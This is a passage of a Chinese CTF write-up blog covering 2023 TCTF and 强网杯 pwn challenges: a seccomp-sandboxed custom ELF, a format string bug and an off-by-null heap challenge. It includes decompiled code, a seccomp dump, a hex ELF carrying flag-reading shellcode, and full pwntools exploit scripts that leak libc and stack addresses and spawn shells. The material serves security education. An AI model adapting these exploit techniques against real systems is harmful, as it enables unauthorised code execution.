class="string">b&#x27;Index: &#x27;</span>,tbs(idx))</span><br><span class="line">sla(<span class="string">b&#x27;Offset: &#x27;</span>,tbs(offset))</span><br><span class="line">sa(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">p=process(elf_path)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.231.174.57&#x27;,10101)</span></span><br><span class="line">edit(-<span class="number">8</span>,-<span class="number">131</span>,p32(<span class="number">0xfbad0800</span>))</span><br><span class="line"></span><br><span class="line">edit(-<span class="number">8</span>,-<span class="number">91</span>,<span class="string">b&#x27;\x20&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">5</span>)</span><br><span class="line">libc.address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12f0</span>-<span class="number">2205568</span></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">edit(-<span class="number">8</span>,-<span class="number">91</span>,p64(libc.sym[<span class="string">&#x27;__environ&#x27;</span>]+<span class="number">8</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recv(0x9f0+13)</span></span><br><span class="line">p.recv(<span class="number">0xa03</span>)</span><br><span class="line"></span><br><span class="line">stack=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>,-<span class="number">24</span>,p64(stack-<span class="number">0x130</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">24</span>,p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">16</span>,p64(libc.address+<span class="number">0x2a3e6</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,p64(libc.address+<span class="number">0x2a3e5</span>))</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>遇到使用索引却没有检测正负的都要当心</p><h1 id="2023tctf-无中生有"><a href="#2023tctf-无中生有" class="headerlink" title="2023tctf-无中生有"></a>2023tctf-无中生有</h1><p><strong>标签:elf|vdso|可执行栈</strong></p><p><strong>题目介绍:</strong></p><p>题目的意思很明确,让选手自己构建一个ELF上传到靶机运行</p><p>不过对ELF有不少要求</p><ol><li>大小有限制</li><li>必须是静态链接</li><li>不能有syscall和int 80h</li><li>每个段不能同时有写和执行的权限</li></ol><p>此外,启动ELF时还有继承的沙盒</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0c</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0014</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x11</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x10</span> <span class="number">0x00</span> <span class="number">0x0000000c</span>  <span class="keyword">if</span> (A == brk) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x0f</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x0e</span> <span class="number">0x00</span> <span class="number">0x40000001</span>  <span class="keyword">if</span> (A == x32_write) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x0d</span> <span class="number">0x00</span> <span class="number">0x40000009</span>  <span class="keyword">if</span> (A == x32_mmap) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x0c</span> <span class="number">0x00</span> <span class="number">0x4000000b</span>  <span class="keyword">if</span> (A == x32_munmap) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0c</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A != execve) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000014</span>  A = filename &gt;&gt; <span class="number">32</span> <span class="meta"># execve(filename, argv, envp)</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0x00007fff</span>  <span class="keyword">if</span> (A != <span class="number">0x7fff</span>) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = filename <span class="meta"># execve(filename, argv, envp)</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x08</span> <span class="number">0xffffe29e</span>  <span class="keyword">if</span> (A == <span class="number">0xffffe29e</span>) <span class="keyword">goto</span> <span class="number">0021</span> <span class="keyword">else</span> <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0x40000003</span>  <span class="keyword">if</span> (A != ARCH_I386) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0016</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0017</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000006</span>  <span class="keyword">if</span> (A == lstat) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0018</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A != fstat) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0019</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000018</span>  A = statbuf <span class="meta"># fstat(fd, statbuf)</span></span><br><span class="line"> <span class="number">0020</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0021</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0022</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>这些要求其实挺苛刻的,大多数想法因该是让一个段可写可执行,自修改code,变幻出syscall</p><p>不过禁止一个段同时拥有写和执行的权限便断了这条路</p><p>也有人提到利用elf映射机制将两块物理不相邻的段映射到一起,不过貌似比较难实现</p><h2 id="解1-1"><a href="#解1-1" class="headerlink" title="解1:"></a>解1:</h2><p>解1的思路,是利用栈必然是要可读可写的</p><p>因此,在内核加载elf的判断中只判断了stack段是否有执行权限,而不关注读和写权限</p><p>load_elf_binary的源代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Stack area protections */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXSTACK_DEFAULT   0     <span class="comment">/* Whatever the arch defaults to */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXSTACK_DISABLE_X 1     <span class="comment">/* Disable executable stacks */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXSTACK_ENABLE_X  2     <span class="comment">/* Enable executable stacks */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> executable_stack = EXSTACK_DEFAULT;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loc-&gt;elf_ex.e_phnum; i++, elf_ppnt++)</span><br><span class="line">    <span class="keyword">switch</span> (elf_ppnt-&gt;p_type) &#123;</span><br><span class="line">    <span class="keyword">case</span> PT_GNU_STACK:</span><br><span class="line">        <span class="keyword">if</span> (elf_ppnt-&gt;p_flags &amp; PF_X)</span><br><span class="line">            executable_stack = EXSTACK_ENABLE_X;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            executable_stack = EXSTACK_DISABLE_X;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>即就算将stack段的权限设置为—x,那么实际运行时权限也是rwx</p><p>以此就饶过了不能同时又写和执行权限这个检查</p><p><strong>ELF十六进制:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7F454C4602010100000000000000000002003E0001000000B00040000000000040000000000000001001000000000000000000004000380002004000030002000100000005000000000000000000000000004000000000000000400000000000F500000000000000F500000000000000000020000000000051E574640100000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000048C7C0A2DBC3004835ADDE0000504989E04831F64831D25248C7C0666C6167504889E74831C0B00241FFD04889C74889E6B230B00041FFD04831FFBF01000000B00141FFD00000002E7368737472746162002E74657874000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B000000010000000600000000000000B000400000000000B0000000000000004700000000000000000000000000000010000000000000000000000000000000010000000300000000000000000000000000000000000000F7000000000000004700000000000000000000000000000001000000000000000000000000000000</span><br></pre></td></tr></table></figure><h2 id="解2-1"><a href="#解2-1" class="headerlink" title="解2:"></a>解2:</h2><p>解2的思路是利用程序启动时存在的vdso段</p><p>在vdso段中存在天然的syscall ret gadget</p><p>不过如何确定vdso的地址,</p><p>方法1是vdso的随机化范围很小,可以尝试爆破</p><p>方法2是在栈上能够找到指向vdso的指针,确定偏移就是</p><h2 id="seccomp-tools检测带参数elf"><a href="#seccomp-tools检测带参数elf" class="headerlink" title="seccomp-tools检测带参数elf"></a>seccomp-tools检测带参数elf</h2><p>在用seccomp-tools的过程中需要注意的是如果程序需要参数的话，可能就会分析失败。</p><p>例如本题</p><p>此时最佳办法是在prctl函数设置断点，然后dump第三个指针参数对应的内存。</p><p>之后再用disasm功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools disasm dumpfile</span><br></pre></td></tr></table></figure><h1 id="2023强网杯-ez-fmt"><a href="#2023强网杯-ez-fmt" class="headerlink" title="2023强网杯-ez_fmt"></a>2023强网杯-ez_fmt</h1><p><strong>标签:格式化字符串</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;There is a gift for you %p\n&quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( w == <span class="number">0xFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    w = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式化字符串漏洞,给了libc,会给栈地址</p><p>为了不让<code>w = 0</code>执行,选择修改printf的返回地址</p><p>返回到read处,因为单次长度有限,所以多次利用格式化字符串漏洞,</p><p>以此泄露libc并修改main的返回地址为one_gadget</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./ez_fmt&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(script):</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p=process(elf_path)</span><br><span class="line"><span class="comment">#p=remote(&#x27;47.104.24.40&#x27;,1337)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">stack=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">12</span>:],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%176c%10$hhn%16224c%11$hn%19$paa&#x27;</span></span><br><span class="line">payload+=p64(stack-<span class="number">8</span>)+p64(stack-<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">s(payload)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">stack2=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">12</span>:],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;stack2&#x27;</span>,stack2)</span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line">leak(<span class="string">&#x27;startmain&#x27;</span>,libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]+<span class="number">243</span>)</span><br><span class="line"></span><br><span class="line">one=libc.address+<span class="number">0xe3b01</span></span><br><span class="line">leak(<span class="string">&#x27;one&#x27;</span>,one)</span><br><span class="line">one=p64(one)</span><br><span class="line"><span class="comment">#irt()</span></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c%9$hhn%&#123;&#125;c%10$hn&#x27;</span>.<span class="built_in">format</span>(one[<span class="number">2</span>],one[<span class="number">1</span>]*<span class="number">0x100</span>+one[<span class="number">0</span>]-one[<span class="number">2</span>]).ljust(<span class="number">24</span>,<span class="string">&#x27;a&#x27;</span>).encode()</span><br><span class="line">payload+=p64(stack2+<span class="number">0x68</span>+<span class="number">2</span>)+p64(stack2+<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h1 id="2023强网杯-warmup23"><a href="#2023强网杯-warmup23" class="headerlink" title="2023强网杯-warmup23"></a>2023强网杯-warmup23</h1><p><strong>标签:off-by-null|tcache attack</strong></p><p>保护机制全部开启,存在沙盒,libc是2.35版本</p><p>静态分析可以看出是常规的菜单题</p><p>但是并没有edit</p><p>看主要的add函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">18</span> &amp;&amp; *((_QWORD *)&amp;unk_4040 + i); ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">19</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;FUll!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    v2 = getnum();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">0xFFFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_QWORD *)&amp;unk_4040 + i) = <span class="built_in">malloc</span>(v2);</span><br><span class="line">      <span class="keyword">if</span> ( !*((_QWORD *)&amp;unk_4040 + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">        _exit(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Note: &quot;</span>);</span><br><span class="line">      *(_BYTE *)(*((_QWORD *)&amp;unk_4040 + i) + (<span class="type">int</span>)read(<span class="number">0</span>, *((<span class="type">void</span> **)&amp;unk_4040 + i), v2)) = <span class="number">0</span>;<span class="comment">// off-by-null</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Success~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc后即往其中输入数据,存在off-by-null,但也正是这个off-by-null使得无法有效的泄露</p><p>因此需要用到2.29及以上的off-by-null手法</p><p>见<a href="https://tttang.com/archive/1614/">glibc2.29+的off by null利用 - 跳跳糖</a></p><p>核心思想是利用部分写修改残余链信息以满足unlink条件,最终目标依然是搞出chunk overlap</p><p><u>并通过大chunk切割后remainer部分放入unsortedbin制造fd,bk泄露libc,heap则可以通过<strong>unlink后更新的bk指针</strong>泄露</u>,当然也可以释放掉刚才申请的chunk,并再往unsortedbin中释放一个chunk再次切割,使得产生的fd,bk包含heap从而泄露,不过这样更麻烦</p><p>overlap之后就可以利用其中的barrier去uaf打tcache attack从而任意写(依然无法任意读.不过用任意写stdout可以做到)</p><p>再之后做法就多样了可以</p><ol><li>任意写stdout,构造io利用链,使用puts等io函数触发io利用链</li><li>stdout泄露environ,打rop</li></ol><p>个人选择方案1,利用obstack链进行攻击,布置好结构后,首先用</p><p><code>#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</code>gadget完成rdi与rdx的互相交换</p><p>之后去执行setcontext+61完成mprotect返回到shellcode处执行orw</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">b&quot;A&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Note: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>,<span 